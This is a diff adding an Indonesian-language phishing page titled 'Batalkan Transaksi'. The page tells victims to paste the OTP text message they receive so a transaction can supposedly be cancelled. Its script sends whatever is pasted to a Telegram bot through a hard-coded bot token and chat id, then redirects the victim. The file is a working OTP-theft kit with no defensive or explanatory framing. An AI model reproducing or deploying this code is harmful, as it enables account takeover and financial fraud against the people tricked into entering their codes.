@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Batalkan Transaksi</title>
+  <link rel="stylesheet" href="otp.css">
+  <style>
+    #otp-error {
+      color: red;
+      font-size: 14px;
+      margin-top: 4px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="otp-header">
+    <span class="close-btn">&times;</span>
+    <span class="mail-icon">&#9993;</span>
+    <div class="otp-title">Verifikasi Diperlukan</div>
+  </div>
+
+  <div class="alert-warning">
+    <b>Perhatian!</b><br>
+    Untuk kamu ketahui, 6 digit OTP akan dikirim lewat SMS ke ponsel kamu,
+    <b>salin SMS paste disini</b>, segera batalkan permintaan tersebut.
+  </div>
+
+  <form onsubmit="return false;">
+    <div class="otp-row">
+      <textarea id="otp" name="otp" maxlength="300" class="otp-textarea" placeholder="Salin pesan/otp" required></textarea>
+      <div id="otp-error">* Wajib diisi</div>
+    </div>
+    <button type="button" class="btn-lanjut" id="btnBatal" onclick="kirimKeTelegram()" disabled>BATALKAN TRANSAKSI</button>
+  </form>
+
+  <script>
+    const otpInput = document.getElementById("otp");
+    const btnBatal = document.getElementById("btnBatal");
+    const otpError = document.getElementById("otp-error");
+
+    otpInput.addEventListener("input", function () {
+      if (otpInput.value.trim().length > 0) {
+        btnBatal.removeAttribute("disabled");
+        otpError.style.display = "none";
+      } else {
+        btnBatal.setAttribute("disabled", true);
+      }
+    });
+
+    function kirimKeTelegram() {
+      const otp = otpInput.value.trim();
+
+      if (otp === "") {
+        otpError.style.display = "block";
+        otpInput.focus();
+        return;
+      }
+
+      const token = "7699059636:AAEegcYsSqKEGf0fTYJ9cGwucnLjMXNSCsI"; 
+      const chat_id = "5653264904";                                     
+      const message = `📩 OTP Masuk:\n${otp}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, text: message })
+      })
+      .then(response => {
+        if (response.ok) {
+          alert
+          document.querySelector("form").reset();
+          btnBatal.setAttribute("disabled", true);
+          otpError.style.display = "none";
+          window.location.href = "Coba.html";
+        } else {
+          alert("❌ Gagal mengirim OTP.");
+        }
+      })
+      .catch(error => {
+        alert("⚠️ Terjadi error.");
+        console.error(error);
+      });
+    }
+  </script>
+</body>
+</html>
